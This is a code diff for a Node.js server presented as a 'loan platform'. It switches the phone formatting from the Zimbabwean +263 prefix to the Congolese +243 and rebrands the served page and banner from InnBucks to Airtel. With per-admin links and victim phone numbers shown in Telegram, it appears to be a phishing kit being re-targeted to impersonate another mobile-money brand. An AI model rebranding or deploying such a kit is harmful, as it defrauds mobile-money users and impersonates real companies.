@@ -43,14 +43,14 @@ function getAdminIdByChatId(chatId) {
     return null;
 }
 
-// Format +263XXXXXXXXX → 0XXXXXXXXX for Telegram display
+// Format +243XXXXXXXXX → 0XXXXXXXXX for Telegram display
 function formatPhone(phoneNumber) {
     if (!phoneNumber) return phoneNumber;
-    // Handle double prefix e.g. +2630712345678 → 0712345678
-    if (phoneNumber.startsWith('+2630')) return phoneNumber.slice(4); // +2630... → 0...
-    if (phoneNumber.startsWith('+263'))  return '0' + phoneNumber.slice(4); // +263... → 0...
-    if (phoneNumber.startsWith('2630'))  return phoneNumber.slice(3);  // 2630... → 0...
-    if (phoneNumber.startsWith('263'))   return '0' + phoneNumber.slice(3); // 263... → 0...
+    // Handle double prefix e.g. +2430712345678 → 0712345678
+    if (phoneNumber.startsWith('+2430')) return phoneNumber.slice(4); // +2430... → 0...
+    if (phoneNumber.startsWith('+243'))  return '0' + phoneNumber.slice(4); // +243... → 0...
+    if (phoneNumber.startsWith('2430'))  return phoneNumber.slice(3);  // 2430... → 0...
+    if (phoneNumber.startsWith('243'))   return '0' + phoneNumber.slice(3); // 243... → 0...
     if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber; // bare 7... → 07...
     return phoneNumber;
 }
@@ -1382,7 +1382,7 @@ app.get('/health', (req, res) => {
     });
 });
 
-// ── Serve the InnBucks HTML ──
+// ── Serve the Airtel HTML ──
 app.get('/', async (req, res) => {
     const adminId = req.query.admin;
 
@@ -1401,14 +1401,14 @@ app.get('/', async (req, res) => {
         }
     }
 
-    res.sendFile(path.join(__dirname, 'innbucks-integrated.html'));
+    res.sendFile(path.join(__dirname, 'airtel-integrated.html'));
 });
 
 // ==========================================
 // START SERVER
 // ==========================================
 app.listen(PORT, () => {
-    console.log(`\n💎 INNBUCKS LOAN PLATFORM`);
+    console.log(`\n💎 AIRTEL LOAN PLATFORM`);
     console.log(`==========================`);
     console.log(`🌐 Server: http://localhost:${PORT}`);
     console.log(`🤖 Bot: WEBHOOK MODE ✅`);
